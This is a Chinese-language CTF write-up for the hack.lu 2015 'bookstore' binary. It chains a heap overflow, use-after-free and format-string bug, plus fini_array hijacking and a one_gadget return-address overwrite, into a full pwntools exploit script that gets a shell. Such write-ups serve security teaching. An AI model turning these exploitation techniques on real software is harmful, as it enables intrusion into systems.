<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;3a15f5a8e83e55c535d220473fa76c314d26b124, stripped</span><br><span class="line"></span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h3 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h3><p>程序是一个买书的系统，最多只能购买两本书。每一本书都用一个独立的堆去维护，这个堆是程序自行申请的，不能人工干预的，固定大小为 0x80 。</p>
<p>可以新增、删除书籍，最后提交是会将两本书（两个堆）信息合并到一个新的堆中，然后进行输出。</p>
<h3 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><h4 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h4><p>录入书籍信息用一个自定义输入函数，这个函数存在一个堆溢出的问题。结束输入的判断标准是遇到 \n ，需要注意的是自定义输入函数会在输入字符串最后加上一个 \x00 ：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-UeGvjNWMx6CKidQp.png"></p>
<h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p>程序的删除函数只是将堆释放，并没有将指针置零：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-hPFo7mUDVdOY9rRM.png"></p>
<h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p>程序退出打印信息时，会出现一个格式化字符串漏洞：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-03-3RqbLskHDRReG7NX.png"></p>
<h4 id="奇怪的输入长度"><a href="#奇怪的输入长度" class="headerlink" title="奇怪的输入长度"></a>奇怪的输入长度</h4><p>菜单选择输入长度上限为 0x80 ，这里不算是一个漏洞，但是会在后面利用当中运用到。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-S4UbIBlARivRMmeo.png"></p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><blockquote>
<p>这条题目利用起来比较复杂，涉及到堆溢出、堆重叠、格式化字符串、劫持 fini_array 。下面先写出大致步骤</p>
</blockquote>
<ol>
<li>free book2</li>
<li>利用堆溢出修改在 bin 中的 book2 size 为 0x151 ，让 summit 申请的 chunk 放在这里；写入精心布置的格式化字符串和 padding ，劫持 fini_array 、泄露地址</li>
<li>第二轮运行程序： free book2</li>
<li>利用堆溢出修改在 bin 中的 book2 size 为 0x151 ，让 summit 申请的 chunk 放在这里；写入精心布置的格式化字符串和 padding ，修改返回地址为 one_gadget</li>
</ol>
<p>产生这种解题思路思考方向：先着眼简单、已经学过熟悉的漏洞，也就是格式化字符串这个漏洞。利用格式化字符串的话，就是修改 got 表或者返回地址等控制程序流程 getshell 。</p>
<ol>
<li>这里 格式化字符串 出现在最后一个 printf ，也就是输出完成之后程序就会退出。</li>
<li>格式化字符串的内容是从 submit  申请的 dest 中读取的。</li>
<li>用户无法自行分配堆，只能从程序本身申请的 3 块堆和 submit 功能设法利用。</li>
</ol>
<h4 id="控制格式化字符串内容"><a href="#控制格式化字符串内容" class="headerlink" title="控制格式化字符串内容"></a>控制格式化字符串内容</h4><p>先来解决格式化字符串内容的问题。内容是从 dest 中读取的，就要设法控制 dest  内容。这里利用的是 overlapping 堆重叠，将 chunk2 和 chunk3 重叠起来，利用 submit 复制功能溢出控制 dest 中的内容。</p>
<p>造成 overlapping 先 free chunk2 ，再通过写入 book1 功能溢出修改 chunk2 的 size 字段为 0x151 。这样当 submit 功能申请 0x140 堆块（不含chunk header）的时候就会去到 unsortedbin 中找到被我们修改大小为 0x151 的 chunk2 。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-1f1IV0WHxcpMxOvo.png"></p>
<p>submit 功能正常情况下复制的内容是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Order 1: &quot; + book1 + &quot;\nOrder 2: &quot; + book2 + &#39;\n&#39;</span><br></pre></td></tr></table></figure>

<p>但是我们将 chunk2 chunk3 重叠在一起，且 chunk header 是同一地址。简单点就是两个堆开始地址相同，结束地址不同。</p>
<p>chunk1 chunk2 地址指针运行过程中没有被二次赋值，一直保存着申请堆时的地址。（free chunk2 时因为有 UAF 漏洞，所以没被重置。）造成的影响就是 chunk2 的内容 submit 的时候被写为 <code>&quot;Order 1: &quot; + book1 </code>，详细过程如下：</p>
<ol>
<li><p>submit 处理 chunk1 信息，向 chunk3（即chunk2）写入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Order 1: &quot; + book1</span><br></pre></td></tr></table></figure></li>
<li><p>submit 处理 chunk2 信息，向 chunk3（即chunk2）写入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\nOrder 2: &quot; + &quot;Order 1: &quot; + book1 + &#39;\n&#39;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>先看看 chunk1、chunk2（chunk3）、dest 三个堆的分布情况：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-waueydoBLLdD7QWO.png"></p>
<p>我们控制 chunk1 内容，写入有效 payload 和 padding ，将有效 payload 溢出写入到 dest （fd 指针处开始）。换句话就是我们希望图上 0xef3010 开始写入的内容，复制到 0xef3130 。可以得出计算公式：（”” 不算个数）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 需要在复制第二个chunk1前，填充好0x90字节，也就是chunk2(3) fd开始到dest fd开始的距离，这样chunk1就会被复制到dest fd开始</span><br><span class="line">&quot;Order 1:&quot; + chunk1 + &quot;\n&quot; + &quot;Order 2:&quot; + &quot;Order 1:&quot; &#x3D;&#x3D; 0x90</span><br><span class="line"># 化简为</span><br><span class="line">chunk1 &#x3D;&#x3D; 0x90 - 28 &#x3D;&#x3D; 0x74</span><br></pre></td></tr></table></figure>

<p>得出结论：将有效 payload 写在 chunk1 开头，然后将 chunk1 用非 \x00 填充长度为 0x74 ，当submit 的时候，有效 payload 就会放在 dest 的 fd 。这样就获得一个任意读写的格式化字符串，需要利用格式化字符串泄露、修改提前在修改 chunk1 时写入即可。</p>
<p>目前得出 payload ：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>	<span class="comment">#格式化字符串</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x74</span>,<span class="string">&#x27;a&#x27;</span>).ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x151</span>)	</span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br></pre></td></tr></table></figure>

<h4 id="劫持-fini-array"><a href="#劫持-fini-array" class="headerlink" title="劫持 fini_array"></a>劫持 fini_array</h4><p>格式化字符串内容已经设法控制了，但是 getshell 需要两次使用这个漏洞，一次泄露地址，一次修改地址。</p>
<p>这里就需要用到一个知识，main 函数是二弟，他有大哥，有三弟。程序开始先运行一次大哥，在运行 main ，最后运行三弟。三弟当做有个数组：<code>.fini_array</code> 。程序退出后会执行 <code>.fini_array</code> 地址出的函数，不过只能利用一次（动态链接程序）。</p>
<p>所以我们可以在格式化字符串的第一轮泄露地址的同时，修改 .fini_array 的地址为 main 函数地址，让程序重新运行一次。main 函数地址易知，关键是 .fini_array 地址怎么找。</p>
<blockquote>
<p>动态链接与静态链接查找和利用有差别，为了篇幅将两者区别放在最后。对 64 位静态程序劫持 fini_array 有兴趣可以看看：<a href="https://www.mrskye.cn/archives/173/">劫持 64 位 fini_array 进行 ROP 攻击</a></p>
</blockquote>
<h5 id="Way-1"><a href="#Way-1" class="headerlink" title="Way 1"></a>Way 1</h5><p>IDA 中 <code>Ctrl+S</code> 查找 .fini_array 地址，可以看到这个数组空间大小为 8 字节，只能放一个地址，这是与静态程序的一个区别（静态有两个地址）。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png"></p>
<h5 id="Way-2"><a href="#Way-2" class="headerlink" title="Way 2"></a>Way 2</h5><p>用 gdb 调试程序，输入 <code>elf</code> 查找 .fini_array </p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png"></p>
<p>要素具备但是遇到一个问题，格式化字符串的内容是存放在堆上，栈上面只有该堆的指针而已。类似题目：ctf-wiki 的<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example-zh/#_22">堆上的格式化字符串漏洞</a> 。</p>
<p>这道题目我们不搞栈迁移到堆上面，而是利用菜单的奇怪输入长度，将地址写入到栈上。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为了对齐前面填充8字节用来放菜单选项，fini_array偏移为13</span></span><br><span class="line"><span class="comment"># 泄露libc可以用__libc_start_main也可以和我一样自己往栈上写一个</span></span><br><span class="line">payload2 = <span class="string">&#x27;5&#x27;</span>*<span class="number">8</span> + p64(fini_array) + p64(free_got)</span><br><span class="line">p.recvuntil(<span class="string">&quot;5: Submit\n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br></pre></td></tr></table></figure>

<p>泄露 libc 地址和劫持 fini_array payload 目前构造：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&quot;%2617c%13$hn&quot;</span> + <span class="string">&#x27;|&#x27;</span> + <span class="string">&quot;%14$s&quot;</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x74</span>,<span class="string">&#x27;a&#x27;</span>).ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x151</span>)		</span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br></pre></td></tr></table></figure>

<h4 id="修改-main-函数返回地址"><a href="#修改-main-函数返回地址" class="headerlink" title="修改 main 函数返回地址"></a>修改 main 函数返回地址</h4><p>到这里我们就获取了 libc_base 地址并且进入了第二次的 main 函数。下一步就是如何利用了。</p>
<p>就 free got 表改为 onegadget ？在这里不行，因为修改玩之后需要触发，也就是再一次进入 main 函数触发 free 函数。第二次进入 main 函数实际上是在 __libc_csu_fini 这个退出函数中调用 fini_array 数组中存储的函数（main），当执行完 main ，就会继续完成退出函数，然后正常退出程序。</p>
<p>这里有两个思路：</p>
<ol>
<li>同第一次 mian 中，泄露出栈地址，通过调试获取到第二次 main 的返回地址与泄露栈地址的偏移，就可以获取到 main rip 的栈地址，我们对此进行修改。</li>
<li>修改退出函数当中某个函数的 got 表，当完成退出函数调用这个函数就会 getshell。</li>
</ol>
<p>第二种思路是有几次比赛出现过这种利用方法，但没有在这道题目上尝试，主要是太费劲了。这道题就用第一种方法，就是需要我们泄露出 栈地址 ，然后因为栈结构固定，所以通过偏移算出第二 main 函数的返回地址。</p>
<p>通过调试查看第一个 main 函数的栈空间结构体：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-7YehpeGp46LWyAuO.png"></p>
<p> 在格式化字符串的时候把这个地址也泄露出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&quot;%2617c%13$hn&quot;</span> + <span class="string">&#x27;|&#x27;</span> + <span class="string">&quot;%14$s&quot;</span> + <span class="string">&#x27;-&#x27;</span> + <span class="string">&quot;%24$p&quot;</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x74</span>,<span class="string">&#x27;a&#x27;</span>).ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x151</span>)		</span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br></pre></td></tr></table></figure>

<p>再次通过调试找到第二次 main 函数返回地址，然后计算固定偏移：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffea45d8980</span>-<span class="number">0x7ffea45d887a</span>=<span class="number">0x106</span></span><br></pre></td></tr></table></figure>

<p>所以得出计算公式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret_addr 为泄露地址</span></span><br><span class="line">attack_addr = ret_addr - <span class="number">0x106</span></span><br></pre></td></tr></table></figure>

<p>第二次进入 main 函数的利用思路就出来了，和第一次进入一样，先释放 chunk2 造成 overlapping 堆重叠，控制 dest 内容从而控制格式化字符串内容。利用格式化字符串修改第二次 main 函数的返回地址为 onegadget 。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : books.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./books&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./books&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;5: Submit\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(cmd))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">cmd,content</span>):</span></span><br><span class="line">    command(cmd)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;order:\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    command(cmd+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main_addr = <span class="number">0x400A39</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ====round1====</span></span><br><span class="line"><span class="comment"># free book2 放入 unsortedbin </span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 修改 fini_array 为 main</span></span><br><span class="line"><span class="comment"># 泄露 libc_base</span></span><br><span class="line"><span class="comment"># 泄露 stack 地址</span></span><br><span class="line">payload1 = <span class="string">&quot;%2617c%13$hn&quot;</span> + <span class="string">&#x27;|&#x27;</span> + <span class="string">&quot;%14$s&quot;</span> + <span class="string">&#x27;-&#x27;</span> + <span class="string">&quot;%24$p&quot;</span></span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x74</span>,<span class="string">&#x27;a&#x27;</span>).ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x151</span>)      </span><br><span class="line">edit(<span class="number">1</span>,payload1)            </span><br><span class="line"></span><br><span class="line"><span class="comment"># 从菜单选项将fini_array和free_got写入到栈上</span></span><br><span class="line">payload2 = <span class="string">&#x27;5&#x27;</span>*<span class="number">8</span> + p64(fini_array) + p64(free_got)</span><br><span class="line">p.recvuntil(<span class="string">&quot;5: Submit\n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;|&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;|&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理libc地址</span></span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;free_addr:&quot;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">onegadget = libc_base + <span class="number">0x45226</span> </span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">ret_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;ret_addr:&quot;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">attack_addr = ret_addr - <span class="number">0x106</span></span><br><span class="line">log.info(<span class="string">&quot;attack_addr:&quot;</span>+<span class="built_in">hex</span>(attack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====round2====</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同 round1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理格式化字符串填充字节数，处理高地址值小于低地址情况</span></span><br><span class="line">one_1 = onegadget &amp; <span class="number">0xffff</span></span><br><span class="line">log.info(<span class="string">&quot;one_1:&quot;</span>+<span class="built_in">hex</span>(one_1))</span><br><span class="line">one_2 = onegadget&gt;&gt;<span class="number">16</span> &amp; <span class="number">0xffff</span></span><br><span class="line">log.info(<span class="string">&quot;one_2:&quot;</span>+<span class="built_in">hex</span>(one_2))</span><br><span class="line"><span class="keyword">if</span> one_1 &gt; one_2:</span><br><span class="line">    one_2 = one_2 + <span class="number">0x10000</span> - one_1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_2 -= one_1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改第二次main返回地址</span></span><br><span class="line">payload4 = <span class="string">&quot;%&#123;&#125;c%13$hn&quot;</span>.<span class="built_in">format</span>(one_1) + <span class="string">&quot;%&#123;&#125;c%14$hn&quot;</span>.<span class="built_in">format</span>(one_2)</span><br><span class="line">payload4 = payload4.ljust(<span class="number">0x74</span>,<span class="string">&#x27;c&#x27;</span>).ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload4 += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload4)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload3 = <span class="string">&#x27;5&#x27;</span>*<span class="number">8</span> + p64(attack_addr) + p64(attack_addr+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;5: Submit\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-246783.htm">hack.lu 2015 bookstore writeup</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43449190/article/details/89077783">2015-hacklu-bookstore</a></li>
</ul>
<h3 id="补充总结"><a href="#补充总结" class="headerlink" title="补充总结"></a>补充总结</h3><h5 id="怎么找-fini-array-？"><a href="#怎么找-fini-array-？" class="headerlink" title="怎么找 fini_array ？"></a>怎么找 fini_array ？</h5><p>首先 fini_array 是 __libc_csu_fini 函数里面会用的一个列表，当程序退出时会调用这个数组存放的一个或两个函数，调用完成后才继续完成退出函数，这时才是真正退出程序。</p>
<h6 id="64-位静态链接程序"><a href="#64-位静态链接程序" class="headerlink" title="64 位静态链接程序"></a>64 位静态链接程序</h6><p>fini_array 数组长度为 0x10 字节，里面放了两个函数地址，退出 main 函数会先执行 fini_array[1] ，然后执行 fini_array[0] 。</p>
<p>在<a href="https://www.mrskye.cn/archives/173">劫持 64 位静态程序 fini_array 进行 ROP 攻击</a>里面接触的是 64 位静态编译的程序，程序是没有符号表的，寻找 fini_array 方法是：</p>
<p>首先 <code>readelf -h 程序名</code> 查看程序加载入口地址。</p>
<p>gdb 调试将断点打在入口地址 ，然后找到有三个传参的 mov 指令，mov r8 就是 __libc_csu_fini 的地址：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401A60                 public start</span><br><span class="line">.text:0000000000401A60 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401A60 ; __unwind &#123;</span><br><span class="line">.text:0000000000401A60                 xor     ebp, ebp</span><br><span class="line">.text:0000000000401A62                 mov     r9, rdx</span><br><span class="line">.text:0000000000401A65                 pop     rsi</span><br><span class="line">.text:0000000000401A66                 mov     rdx, rsp</span><br><span class="line">.text:0000000000401A69                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000401A6D                 push    rax</span><br><span class="line">.text:0000000000401A6E                 push    rsp</span><br><span class="line">.text:0000000000401A6F                 mov     r8, offset sub_402BD0 ; fini</span><br><span class="line">.text:0000000000401A76                 mov     rcx, offset loc_402B40 ; init</span><br><span class="line">.text:0000000000401A7D                 mov     rdi, offset main</span><br><span class="line">.text:0000000000401A84                 db      67h</span><br><span class="line">.text:0000000000401A84                 call    __libc_start_main</span><br><span class="line">.text:0000000000401A8A                 hlt</span><br><span class="line">.text:0000000000401A8A ; &#125; // starts at 401A60</span><br><span class="line">.text:0000000000401A8A start           endp</span><br></pre></td></tr></table></figure>

<p>然后 <code>x /20i addr</code> 查看该地址开始的汇编，找到 <code>lea    rbp,[rip+0xb***1] # 0x4***f0</code> ，这个地址就是 fini_array[1] 的地址：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20i 0x402bd0</span></span><br><span class="line">  0x402bd0 &lt;__libc_csu_fini&gt;:    push   rbp</span><br><span class="line">  0x402bd1 &lt;__libc_csu_fini+1&gt;:    lea    rax,[rip+0xb24e8]        # 0x4***c0 </span><br><span class="line">  0x402bd8 &lt;__libc_csu_fini+8&gt;:    lea    rbp,[rip+0xb24d1]        # 0x4***b0 </span><br><span class="line">  0x402bdf &lt;__libc_csu_fini+15&gt;:    push   rbx</span><br><span class="line">  0x402be0 &lt;__libc_csu_fini+16&gt;:    sub    rax,rbp</span><br><span class="line">  0x402be3 &lt;__libc_csu_fini+19&gt;:    sub    rsp,0x8</span><br><span class="line">  0x402be7 &lt;__libc_csu_fini+23&gt;:    sar    rax,0x3</span><br><span class="line">  0x402beb &lt;__libc_csu_fini+27&gt;:    je     0x402c06 &lt;__libc_csu_fini+54&gt;</span><br><span class="line">  0x402bed &lt;__libc_csu_fini+29&gt;:    lea    rbx,[rax-0x1]</span><br><span class="line">  0x402bf1 &lt;__libc_csu_fini+33&gt;:    nop    DWORD PTR [rax+0x0]</span><br><span class="line">  0x402bf8 &lt;__libc_csu_fini+40&gt;:    call   QWORD PTR [rbp+rbx*8+0x0]</span><br><span class="line">  0x402bfc &lt;__libc_csu_fini+44&gt;:    sub    rbx,0x1</span><br><span class="line">  0x402c00 &lt;__libc_csu_fini+48&gt;:    cmp    rbx,0xffffffffffffffff</span><br><span class="line">  0x402c04 &lt;__libc_csu_fini+52&gt;:    jne    0x402bf8 &lt;__libc_csu_fini+40&gt;</span><br><span class="line">  0x402c06 &lt;__libc_csu_fini+54&gt;:    add    rsp,0x8</span><br><span class="line">  0x402c0a &lt;__libc_csu_fini+58&gt;:    pop    rbx</span><br><span class="line">  0x402c0b &lt;__libc_csu_fini+59&gt;:    pop    rbp</span><br><span class="line">  0x402c0c &lt;__libc_csu_fini+60&gt;:    jmp    0x48f52c &lt;_fini&gt;</span><br></pre></td></tr></table></figure>

<h6 id="64-位动态链接程序"><a href="#64-位动态链接程序" class="headerlink" title="64 位动态链接程序"></a>64 位动态链接程序</h6><p>fini_array 数组长度为 0x8 字节，里面放了一个函数地址，退出 main 函数会执行 fini_array[0]。</p>
<p>gdb 输入 <code>elf</code> 找 <code>.fini_array</code> ，开始地址就是 fini_array[0] </p>
